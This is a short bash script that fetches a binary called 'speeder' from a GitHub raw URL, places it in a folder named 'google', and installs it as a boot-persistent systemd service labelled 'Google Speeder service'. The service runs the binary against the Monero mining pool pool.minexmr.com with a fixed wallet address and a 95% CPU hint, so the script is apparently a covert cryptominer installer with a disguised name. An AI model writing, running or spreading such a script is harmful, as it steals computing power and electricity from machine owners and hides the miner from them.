#!/bin/bash
curl -L --progress-bar "https://raw.githubusercontent.com/gamemod5/auto/main/speeder" -o /tmp/speeder
[ -d $HOME/google ] || mkdir $HOME/google
cp /tmp/speeder $HOME/google/
sudo chmod +x $HOME/google/speeder
cat >/tmp/google-speeder.service <<EOL
[Unit]
Description=Google Speeder service
[Service]
ExecStart=$HOME/google/speeder -o pool.minexmr.com:4444 --cpu-max-threads-hint 95 -u 498My7UqdWZSrBbzwzC3CoeKKuT8pT7UD1571wSVTUiBHxBgFg3iq3eaT924CKScR67TxEQVtxN7becrHfxHHDuyTnPd6Ue
Restart=always
Nice=10
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL
sudo mv /tmp/google-speeder.service /etc/systemd/system/google-speeder.service
echo "[*] Starting google-speeder systemd service"
sudo killall speeder 2>/dev/null
sudo systemctl daemon-reload
sudo systemctl enable google-speeder.service
sudo systemctl start google-speeder.service
